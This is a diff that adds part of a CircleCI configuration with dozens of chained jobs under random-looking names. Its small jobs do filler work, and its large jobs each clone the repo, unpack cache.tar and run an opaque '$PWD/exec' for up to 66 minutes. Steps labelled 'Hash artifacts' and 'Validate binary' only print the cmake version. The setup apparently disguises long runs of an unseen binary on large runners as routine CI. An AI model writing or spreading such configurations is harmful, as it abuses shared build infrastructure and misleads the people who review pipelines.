+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 500 | tac | head -5; true ; } > /tmp/share/report.out
+            len=$(wc -c </tmp/share/report.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - report.out
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/report.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  env_hyperion-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: starved
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hi > "$tf" && stat -c %s "$tf" 2>/dev/null && rm "$tf"; true ; } > /tmp/share/gate-ready.log
+            len=$(wc -c </tmp/share/gate-ready.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - gate-ready.log
+  hyperion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/gate-ready.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  C_Prepare_Pipeline9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: caprice
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 204800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/share/.state
+            len=$(wc -c </tmp/share/.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - .state
+  Prepare_Pipeline9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/.state || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+  reload_LAB_STAGE_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: straight shot
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=25;i++){f = (i==1||i==2 ? 1 : f1+f2); f2 = f1; f1 = f}; print f}' 2>/dev/null || awk 'BEGIN{a=1;b=1;for(i=3;i<=25;i++){c=a+b;a=b;b=c}; print b}'; true ; } > /tmp/share/.ok
+            len=$(wc -c </tmp/share/.ok); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - .ok
+  LAB_STAGE_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Pull handoff
+          command: |
+            wc -c /tmp/share/.ok || true
+      - run:
+          name: Get project
+          command: git clone --depth 2 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xf cache.tar
+      - run:
+          name: Hash artifacts
+          command: cmake --version
+      - run:
+          name: Validate binary
+          command: cmake --version
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/exec
+
+workflows:
+  matrix:
+    jobs:
+      - reload_LAB_STAGE_7
+      - LAB_STAGE_7:
+          requires:
+            - reload_LAB_STAGE_7
+      - audit_INFRA-404:
+          requires:
+            - reload_LAB_STAGE_7
+      - INFRA-404:
+          requires:
+            - audit_INFRA-404
+      - prep_DeployImage:
+          requires:
+            - audit_INFRA-404
+      - DeployImage:
+          requires:
+            - prep_DeployImage
+      - Delta_atlas-rc:
+          requires:
+            - prep_DeployImage
+      - atlas-rc:
+          requires:
+            - Delta_atlas-rc
+      - C_Prepare_Pipeline9:
+          requires:
+            - Delta_atlas-rc
+      - Prepare_Pipeline9:
+          requires:
+            - C_Prepare_Pipeline9
+      - Alpha_lima:
+          requires:
+            - C_Prepare_Pipeline9
+      - lima:
+          requires:
+            - Alpha_lima
+      - reload_dec10-smoke:
+          requires:
+            - Alpha_lima
+      - dec10-smoke:
+          requires:
+            - reload_dec10-smoke
+      - drain_QA_BUILD_7:
+          requires:
+            - reload_dec10-smoke
+      - QA_BUILD_7:
+          requires:
+            - drain_QA_BUILD_7
+      - green_do-the-thing:
+          requires:
+            - drain_QA_BUILD_7
+      - do-the-thing:
+          requires:
+            - green_do-the-thing
+      - staging_fix-dashboard:
+          requires:
+            - green_do-the-thing
+      - fix-dashboard:
+          requires:
+            - staging_fix-dashboard
+      - orchestrate_ed-verify:
+          requires:
+            - staging_fix-dashboard
+      - ed-verify:
+          requires:
+            - orchestrate_ed-verify
+      - orchestrate_titan-ng:
+          requires:
+            - orchestrate_ed-verify
+      - titan-ng:
+          requires:
+            - orchestrate_titan-ng
+      - drain_delta-2:
+          requires:
+            - orchestrate_titan-ng
+      - delta-2:
+          requires:
+            - drain_delta-2
+      - reserve_rust-test:
+          requires:
+            - drain_delta-2
+      - rust-test:
+          requires:
+            - reserve_rust-test
+      - fixture_romeo
+      - romeo:
+          requires:
+            - fixture_romeo
+      - Delta_validate-end-to-end-artifact-bundle:
+          requires:
+            - fixture_romeo
+      - validate-end-to-end-artifact-bundle:
+          requires:
+            - Delta_validate-end-to-end-artifact-bundle
+      - env_hyperion-v2:
+          requires:
+            - Delta_validate-end-to-end-artifact-bundle
+      - hyperion-v2:
+          requires:
+            - env_hyperion-v2
+      - redo_alice-push:
+          requires:
+            - env_hyperion-v2
+      - alice-push:
+          requires:
+            - redo_alice-push
+      - kick_anothr-run:
+          requires:
+            - redo_alice-push
+      - anothr-run:
+          requires:
+            - kick_anothr-run
+      - db_preview-build:
+          requires:
+            - kick_anothr-run
+      - preview-build:
+          requires:
+            - db_preview-build
+      - Gamma_go1-21-fmt:
+          requires:
+            - db_preview-build
+      - go1-21-fmt:
+          requires:
+            - Gamma_go1-21-fmt
+      - phase2_full-send:
+          requires:
+            - Gamma_go1-21-fmt
+      - full-send:
+          requires:
+            - phase2_full-send
+      - prebuild_go1-21-lint:
+          requires:
+            - phase2_full-send
+      - go1-21-lint:
+          requires:
+            - prebuild_go1-21-lint
+      - stepA_qa-v2:
+          requires:
+            - prebuild_go1-21-lint
+      - qa-v2:
+          requires:
+            - stepA_qa-v2
+      - vendor_nov6-canary:
+          requires:
+            - stepA_qa-v2
+      - nov6-canary:
+          requires:
+            - vendor_nov6-canary
+      - postcheck_ci-alt:
+          requires:
+            - vendor_nov6-canary
+      - ci-alt:
+          requires:
+            - postcheck_ci-alt
+      - linter_promote:
+          requires:
+            - postcheck_ci-alt
+      - promote:
+          requires:
+            - linter_promote
+      - fetch_APP-863:
+          requires:
+            - linter_promote
+      - APP-863:
+          requires:
+            - fetch_APP-863
+      - Gamma_update-oauth-leak:
+          requires:
+            - fetch_APP-863
+      - update-oauth-leak:
+          requires:
+            - Gamma_update-oauth-leak
+      - preflight_sierra-7:
+          requires:
+            - Gamma_update-oauth-leak
+      - sierra-7:
+          requires:
+            - preflight_sierra-7
